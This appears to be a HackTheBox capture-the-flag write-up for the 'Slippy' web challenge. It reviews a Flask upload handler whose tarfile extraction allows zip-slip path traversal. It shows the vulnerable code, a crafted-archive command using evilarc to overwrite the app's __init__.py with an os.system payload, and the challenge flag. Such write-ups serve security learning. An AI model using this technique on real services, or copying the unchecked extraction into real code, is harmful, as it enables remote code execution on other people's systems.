---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [RCE, code-review, flask-debug_mode, path-traversal, python-code-injection, python-tarfile, zip-slip, flask, __init__]
---
>[!quote]
> *You've found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is... what are you going to do about it?*


# Set up

Run the [build-docker.sh](http://build-docker.sh) script

```bash
$ ./build-docker.sh
Error: No such container: web_slippy
Sending build context to Docker daemon  821.2kB
Step 1/11 : FROM python:3-alpine
3-alpine: Pulling from library/python
40e059520d19: Pull complete
4f950178bcec: Pull complete
1d594d4d0bf4: Pull complete
8e36cd7b5f33: Pull complete
0b8007321b2d: Pull complete
...
Successfully tagged web_slippy:latest
2022-03-31 21:15:23,691 INFO Set uid to user 0 succeeded
2022-03-31 21:15:23,695 INFO supervisord started with pid 1
2022-03-31 21:15:24,702 INFO spawned: 'flask' with pid 7
 * Serving Flask app 'application.main' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://127.0.0.1:1337
 * Running on http://172.17.0.2:1337 (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 757-360-259
2022-03-31 21:15:26,416 INFO success: flask entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

# Information Gathering

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe.png)

Application accepts only **tar.gz** files

>[!error]
> This file could not be uploaded, please make sure the file is a valid tar.gz archive!

Uploading a valid **tar.gz** the application unzip the archive’s content and allows to browse files (like a directory listing) 

```xml
tar -czvf file.tar.gz test.txt
```

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%201.png)

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%202.png)

Application code that unzip the archive:

```python
import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []

        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue
            
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)

        tar.close()
        return extracted_filenames

    return False
```

# The Bug

- [https://mail.python.org/pipermail/python-dev/2007-August/074290.html](https://mail.python.org/pipermail/python-dev/2007-August/074290.html)
- [https://bugs.python.org/issue21109](https://bugs.python.org/issue21109)
- [https://snyk.io/research/zip-slip-vulnerability](https://snyk.io/research/zip-slip-vulnerability)

The application does not check for path traversal vulnerability, so it’s possible to force the application into parsing a malicious archive containing a file with multiple “../” that will be stored into an arbitrary folder.

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%203.png)

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%204.png)

# Exploitation

Tool to generate malicious archives:

`tar -czvf files.tar.gz --absolute-names '../../../../../tmp/test.txt'`

[evilarc/evilarc.py at master · ptoomey3/evilarc](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py)

Related article: [Exploiting insecure file extraction in Python for code execution](https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution)

**util.py**

```python
import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
...
```

**run.py**

```python
from application.main import app

app.run(host='0.0.0.0', port=1337, debug=True, use_evalex=False)
```

**exploit.py**

```python
import os
os.system('cp /app/flag* /app/application/static/archives/flag.txt')
```

Generate the malicious **tar.gz** using **evilarc:**

```python
$ python2 evilarc.py __init__.py -f evil.tar.gz -o unix -p app/application/
Creating evil.tar.gz containing ../../../../../../../../app/application/__init__.py
```

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%205.png)

![Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe](../../zzz_res/attachments/Slippy%20377cfe1e5c4948c6b294c3fd26eb13fe%206.png)

# Flag

>[!success]
>`HTB{i_slipped_my_way_to_rce}`

## Video

<iframe width="660" height="415" src="https://www.youtube.com/embed/8eXutSxYhOQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
